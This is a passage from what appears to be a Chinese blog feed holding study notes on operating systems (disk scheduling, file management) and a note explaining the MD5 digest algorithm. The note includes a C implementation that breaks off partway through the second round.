tq)， L(outq)分别指向该队列首尾缓冲</li></ul></li></ul></li><li>Getbuf和Putbuf过程<ul><li>收容：缓冲池接收外界数据</li><li>提取：外界从缓冲池获得数据</li></ul></li><li>缓冲区工作方式（从缓冲区的角度来看）<ul><li>收容输入</li><li>提取输入</li><li>收容输出</li><li>提取输出</li></ul></li></ul></li></ul><h3 id="磁盘存储器的性能和调度"><a class="header-anchor" href="#磁盘存储器的性能和调度"></a>磁盘存储器的性能和调度</h3><ul><li>数据的组织和格式</li><li>磁盘的类型<ul><li>固定头磁盘（贵）</li><li>移动头磁盘</li></ul></li><li>磁盘访问的时间（关键）<ul><li>寻道时间Ts=m*n+s</li><li>旋转延迟时间Tr</li><li>传输时间Tt=b/rN</li><li>总时间Ta=Ts+1/2r+b/rN</li></ul></li><li>磁盘的调度算法（掌握图表）<ul><li>先来先服务（FCFS）<ul><li>优点：公平，简单</li><li>缺点：可能导致某些进程的请求长期得不到满足</li></ul></li><li>最短寻道时间优先（SSTF）<ul><li>说明：要求访问的磁道和当前磁头所在的磁道距离最近，以使每次的寻道时间最短</li></ul></li><li>扫描算法（SCAN）<ul><li>扫描算法不仅考虑到欲访问的磁道与当前磁道间的距离，更优先考虑的是磁道当前的移动方向</li><li>联想电梯的运行</li><li>可防止低优先级进程出现“饥饿”的现象</li></ul></li><li>循环扫描算法（CSCAN）<ul><li>算法规定磁头单向移动，例如，只是自里向外移动，当磁头移到最外的磁道并访问后，磁头立即返回到最里的欲访问磁道，亦即将最小磁道号紧接着最大磁道号构成循环，进行循环扫描</li></ul></li><li>NStepScan算法<ul><li>N步SCAN算法是将磁盘请求队列分成若干个长度为N的子队列，磁盘调度将按FCFS算法依次这些子队列。</li></ul></li><li>FSCAN算法<ul><li>是Nstepscan算法的简化，将磁盘请求队列分成两个子队列</li></ul></li></ul></li></ul><h2 id="第七章：文件管理"><a class="header-anchor" href="#第七章：文件管理"></a>第七章：文件管理</h2><h3 id="数据项"><a class="header-anchor" href="#数据项"></a>数据项</h3><ul><li>基本数据项</li><li>组合数据项</li></ul><h3 id="记录"><a class="header-anchor" href="#记录"></a>记录</h3><ul><li>记录是一组相关数据项的集合，用于描述一个对象在某个方面的属性</li></ul><h3 id="文件"><a class="header-anchor" href="#文件"></a>文件</h3><ul><li>文件类型</li><li>文件长度</li><li>文件的物理位置</li><li>文件的建立时间</li></ul><h3 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h3><ul><li>创建文件</li><li>删除文件</li><li>读文件</li><li>写文件</li><li>设置文件读写的位置</li></ul><h3 id="文件的逻辑结构"><a class="header-anchor" href="#文件的逻辑结构"></a>文件的逻辑结构</h3><ul><li>顺序文件</li><li>记录寻址</li><li>索引文件</li><li>索引顺序文件</li><li>直接文件和哈希文件</li></ul><h3 id="文件目录"><a class="header-anchor" href="#文件目录"></a>文件目录</h3><ul><li>文件控制块（FCB）<ul><li>文件名+inode(属性)</li></ul></li><li>简单的文件目录<ul><li>单级文件目录<ul><li>查找慢</li><li>不允许重名</li><li>不便于实现文件共享</li></ul></li><li>两级文件目录<ul><li>提高检索速度，从M*N到M+N</li></ul></li></ul></li><li>树形结构目录<ul><li>路径名<ul><li>“…”是父目录</li><li>“/”是根目录</li><li>区别绝对路径和相对路径（…/…/…/1/2/3/）</li></ul></li></ul></li></ul><h3 id="文件共享"><a class="header-anchor" href="#文件共享"></a>文件共享</h3><ul><li>有向无循环图（DAG）</li><li>利用符号链接实现文件共享<ul><li>实际上就是“快捷方式”</li></ul></li></ul><h3 id="文件保护"><a class="header-anchor" href="#文件保护"></a>文件保护</h3><p><img src="https://github.com/SSHeRun/CS-Xmind-Note/blob/master/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.png" alt="picture"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5摘要算法笔记</title>
      <link href="/p/16e870e.html"/>
      <url>/p/16e870e.html</url>
      
        <content type="html"><![CDATA[<h1>MD5摘要算法</h1><blockquote><p>MD5不能称作加密算法，因为不能还原出原本的密码。</p></blockquote><p>MD5算法在逆向中经常遇到，所以了解其背后的原理和加密特征是有必要的，因此专门整理一下。</p><p>以下以c语言的其中一种实现为例。</p><hr><a id="more"></a><h2 id="原理"><a class="header-anchor" href="#原理"></a>原理</h2><blockquote><p>MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><p>在MD5算法中:</p><ul><li>第一步：增加填充。首先需要对信息进行填充，使其位长对512求 <code>mod</code> 的结果等于448。因此，信息的位长（Bits Length）将被扩展至<code>N*512+448</code>，N为一个非负整数，N可以是零。填充的方法如下，在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</li><li>第二步：补足长度。然后，将数据长度转换为<code>64bit</code>的数值，如果长度超过<code>64bit</code>所能表示的数据长度的范围，值保留最后<code>64bit</code>，增加到前面填充的数据后面，使得最后的数据为<code>512bit</code>的整数倍。也就是<code>32bit</code>的16倍的整数倍。在<code>RFC1321</code>中，<code>32bit</code>称为一个<code>word</code>。</li></ul><p>经过这两步的处理，现在的信息的位长=<code>N*512+448+64=(N+1)*512</code>，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</p><ul><li>第三步：初始化变量。用到4个变量，分别为<code>A、B、C、D</code>，均为<code>32bit</code>长。初始化为：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A: 01 23 45 67</span><br><span class="line">B: 89 ab cd ef</span><br><span class="line">C: fe dc ba 98</span><br><span class="line">D: 76 54 32 10</span><br></pre></td></tr></table></figure><ul><li>第四步：数据处理。首先定义4个辅助函数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F(X,Y,Z) &#x3D; XY v not(X) Z</span><br><span class="line">G(X,Y,Z) &#x3D; XZ v Y not(Z)</span><br><span class="line">H(X,Y,Z) &#x3D; X xor Y xor Z</span><br><span class="line">I(X,Y,Z) &#x3D; Y xor (X v not(Z))</span><br></pre></td></tr></table></figure><p>其中：<code>XY</code>表示按位与，<code>X v Y</code>表示按位或，<code>not(X)</code>表示按位取反。<code>xor</code>表示按位异或。函数中的<code>X、Y、Z</code>均为<code>32bit</code>。</p><p>定义一个需要用到的数组：</p><p><code>T(i)</code>, <code>i</code> 取值<code>1-64</code>, <code>T(i)</code>等于<code>abs(sin(i))</code>的<code>4294967296</code>倍的整数部分, <code>i</code>为弧度。<br>假设前三步处理后的数据长度为<code>32*16*Nbit</code></p><ul><li>第五步：输出。最后得到的ABCD为输出结果，共128bit。A为低位，D为高位。</li></ul><p>总体流程如下图所示，表示第i个分组，每次的运算都由前一轮的128位结果值和第i块512bit值进行运算。初始的128位值为初始链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为：<code>A=0x01234567</code>，<code>B=0x89ABCDEF</code>，<code>C=0xFEDCBA98</code>，<code>D=0x76543210</code>。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20191030121342096.png" alt="image-20191030121342096.png"></p></blockquote><hr><h2 id="code"><a class="header-anchor" href="#code"></a>code</h2><p>md5.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MD5_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MD5_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line">&#125;MD5_CTX;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x,y,z) ((x &amp; y) | (~x &amp; z))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x,y,z) ((x &amp; z) | (y &amp; ~z))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H(x,y,z) (x^y^z)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I(x,y,z) (y ^ (x | ~z))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTATE_LEFT(x,n) ((x <span class="meta-string">&lt;&lt; n) | (x &gt;&gt; (32-n)))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FF(a,b,c,d,x,s,ac) \</span></span><br><span class="line">          &#123; \</span><br><span class="line">          a += F(b,c,d) + x + ac; \</span><br><span class="line">          a = ROTATE_LEFT(a,s); \</span><br><span class="line">          a += b; \</span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GG(a,b,c,d,x,s,ac) \</span></span><br><span class="line">          &#123; \</span><br><span class="line">          a += G(b,c,d) + x + ac; \</span><br><span class="line">          a = ROTATE_LEFT(a,s); \</span><br><span class="line">          a += b; \</span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HH(a,b,c,d,x,s,ac) \</span></span><br><span class="line">          &#123; \</span><br><span class="line">          a += H(b,c,d) + x + ac; \</span><br><span class="line">          a = ROTATE_LEFT(a,s); \</span><br><span class="line">          a += b; \</span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> II(a,b,c,d,x,s,ac) \</span></span><br><span class="line">          &#123; \</span><br><span class="line">          a += I(b,c,d) + x + ac; \</span><br><span class="line">          a = ROTATE_LEFT(a,s); \</span><br><span class="line">          a += b; \</span><br><span class="line">          &#125;                                            </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Init</span><span class="params">(MD5_CTX *context)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Update</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Final</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> digest[<span class="number">16</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Transform</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> state[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> block[<span class="number">64</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *output, <span class="keyword">unsigned</span> <span class="keyword">int</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Decode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *output, <span class="keyword">unsigned</span> <span class="keyword">char</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>md5.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"md5.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> PADDING[] = &#123; <span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Init</span><span class="params">(MD5_CTX *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    context-&gt;count[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">    context-&gt;state[<span class="number">1</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">    context-&gt;state[<span class="number">2</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line">    context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Update</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, index = <span class="number">0</span>, partlen = <span class="number">0</span>;</span><br><span class="line">    index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">    partlen = <span class="number">64</span> - index;</span><br><span class="line">    context-&gt;count[<span class="number">0</span>] += inputlen &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (context-&gt;count[<span class="number">0</span>] &lt; (inputlen &lt;&lt; <span class="number">3</span>))</span><br><span class="line">        context-&gt;count[<span class="number">1</span>]++;</span><br><span class="line">    context-&gt;count[<span class="number">1</span>] += inputlen &gt;&gt; <span class="number">29</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inputlen &gt;= partlen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;context-&gt;<span class="built_in">buffer</span>[index], input, partlen);</span><br><span class="line">        MD5Transform(context-&gt;state, context-&gt;<span class="built_in">buffer</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = partlen; i + <span class="number">64</span> &lt;= inputlen; i += <span class="number">64</span>)</span><br><span class="line">            MD5Transform(context-&gt;state, &amp;input[i]);</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;context-&gt;<span class="built_in">buffer</span>[index], &amp;input[i], inputlen - i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Final</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> digest[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index = <span class="number">0</span>, padlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> bits[<span class="number">8</span>];</span><br><span class="line">    index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">    padlen = (index &lt; <span class="number">56</span>) ? (<span class="number">56</span> - index) : (<span class="number">120</span> - index);</span><br><span class="line">    MD5Encode(bits, context-&gt;count, <span class="number">8</span>);</span><br><span class="line">    MD5Update(context, PADDING, padlen);</span><br><span class="line">    MD5Update(context, bits, <span class="number">8</span>);</span><br><span class="line">    MD5Encode(digest, context-&gt;state, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *output, <span class="keyword">unsigned</span> <span class="keyword">int</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; len)</span><br><span class="line">    &#123;</span><br><span class="line">        output[j] = input[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        output[j + <span class="number">1</span>] = (input[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        output[j + <span class="number">2</span>] = (input[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        output[j + <span class="number">3</span>] = (input[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        i++;</span><br><span class="line">        j += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Decode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *output, <span class="keyword">unsigned</span> <span class="keyword">char</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; len)</span><br><span class="line">    &#123;</span><br><span class="line">        output[i] = (input[j]) |</span><br><span class="line">            (input[j + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">            (input[j + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">            (input[j + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        i++;</span><br><span class="line">        j += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Transform</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> state[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> block[<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a = state[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> b = state[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> c = state[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> d = state[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> x[<span class="number">64</span>];</span><br><span class="line">    MD5Decode(x, block, <span class="number">64</span>);</span><br><span class="line">    FF(a, b, c, d, x[<span class="number">0</span>], <span class="number">7</span>, <span class="number">0xd76aa478</span>); <span class="comment">/* 1 */</span></span><br><span class="line">    FF(d, a, b, c, x[<span class="number">1</span>], <span class="number">12</span>, <span class="number">0xe8c7b756</span>); <span class="comment">/* 2 */</span></span><br><span class="line">    FF(c, d, a, b, x[<span class="number">2</span>], <span class="number">17</span>, <span class="number">0x242070db</span>); <span class="comment">/* 3 */</span></span><br><span class="line">    FF(b, c, d, a, x[<span class="number">3</span>], <span class="number">22</span>, <span class="number">0xc1bdceee</span>); <span class="comment">/* 4 */</span></span><br><span class="line">    FF(a, b, c, d, x[<span class="number">4</span>], <span class="number">7</span>, <span class="number">0xf57c0faf</span>); <span class="comment">/* 5 */</span></span><br><span class="line">    FF(d, a, b, c, x[<span class="number">5</span>], <span class="number">12</span>, <span class="number">0x4787c62a</span>); <span class="comment">/* 6 */</span></span><br><span class="line">    FF(c, d, a, b, x[<span class="number">6</span>], <span class="number">17</span>, <span class="number">0xa8304613</span>); <span class="comment">/* 7 */</span></span><br><span class="line">    FF(b, c, d, a, x[<span class="number">7</span>], <span class="number">22</span>, <span class="number">0xfd469501</span>); <span class="comment">/* 8 */</span></span><br><span class="line">    FF(a, b, c, d, x[<span class="number">8</span>], <span class="number">7</span>, <span class="number">0x698098d8</span>); <span class="comment">/* 9 */</span></span><br><span class="line">    FF(d, a, b, c, x[<span class="number">9</span>], <span class="number">12</span>, <span class="number">0x8b44f7af</span>); <span class="comment">/* 10 */</span></span><br><span class="line">    FF(c, d, a, b, x[<span class="number">10</span>], <span class="number">17</span>, <span class="number">0xffff5bb1</span>); <span class="comment">/* 11 */</span></span><br><span class="line">    FF(b, c, d, a, x[<span class="number">11</span>], <span class="number">22</span>, <span class="number">0x895cd7be</span>); <span class="comment">/* 12 */</span></span><br><span class="line">    FF(a, b, c, d, x[<span class="number">12</span>], <span class="number">7</span>, <span class="number">0x6b901122</span>); <span class="comment">/* 13 */</span></span><br><span class="line">    FF(d, a, b, c, x[<span class="number">13</span>], <span class="number">12</span>, <span class="number">0xfd987193</span>); <span class="comment">/* 14 */</span></span><br><span class="line">    FF(c, d, a, b, x[<span class="number">14</span>], <span class="number">17</span>, <span class="number">0xa679438e</span>); <span class="comment">/* 15 */</span></span><br><span class="line">    FF(b, c, d, a, x[<span class="number">15</span>], <span class="number">22</span>, <span class="number">0x49b40821</span>); <span class="comment">/* 16 */</span></span><br><span class="line"></span><br><span class="line">                                           <span class="comment">/* Round 2 */</span></span><br><span class="line">    GG(a, b, c, d, x[<span class="number">1</span>], <span class="number">5</span>, <span class="number">0xf61e2562</span>); <span class="comment">/* 17 */</span></span><br><span class="line">    GG(d, a, b, c, x[<span class="number">6</span>], <span class="number">9</span>, <span class="number">0xc040b340</span>); <span class="comment">/* 18 */</span></span><br><span class="line">    GG(c, d, a, b, x[<span class="number">11</span>], <span class="number">14</span>, <span class="number">0x265e5a51</span>); <span class="comment">/* 19 */</span></span><br><span class="line">    GG(b, c, d, a, x[<span class="number">0</span>], <span class="number">20</span>, <span class="number">0xe9b6c7aa</span>); <span class="comment">/* 20 */</span></span><br><span class="line">    GG(a, b, c, d, x[<span class="number">5</span>], <span class="number">5</span>, <span class="number">0xd62f105d</span>); <span class="comment">/* 21 */</span></span><br><span class="line">    GG(d, a, b, c, x[<span class="number">10</span>], <span class="number">9</span>, <span class="number">0x2441453</span>); <span class="comment">/* 22 */</span></span><br><span class="line">    GG(c, d, a, b, x[<span class="number">15</span>], <span class="number">14</span>, <span class="number">0xd8a1e681</span>); <span class="comment">/* 23 */</span></span><br><span class="line">    GG(b, c, d, a, x[<span class="number">4</span>], <span class="number">20</span>, <span class="number">0xe7d3fbc8</span>); <span class="comment">/* 24 */</span></span><br><span class="line">    GG(a, b, c, d, x[<span class="number">9</span>], <span class="number">5</span>, <span class="number">0x21e1cde6</span>); <span class="comment">/* 25 */</span></span><br><span class="line">    GG(d, a, b, c, x[<span class="number">14</span>], <span class="number">9</span>, <span class="number">0xc33707d6</span>); <span class="comment">/* 26 */</span></span><br><span class="line">    GG(c, d, a, b, x[<span class="number">3</span>], <span class="number">14</span>, <span class="number">0xf4d50d87</span>); <span class="comment">/* 27 */</span></span><br><span class="line">    GG(b, c, d, a, x[<span class="number">8</span>], <span class="number">20</span>, <span class="number">0x455a14ed</span>); <span class="comment">/* 28 */</span></span><br><span class="line">    GG(a, b, c, 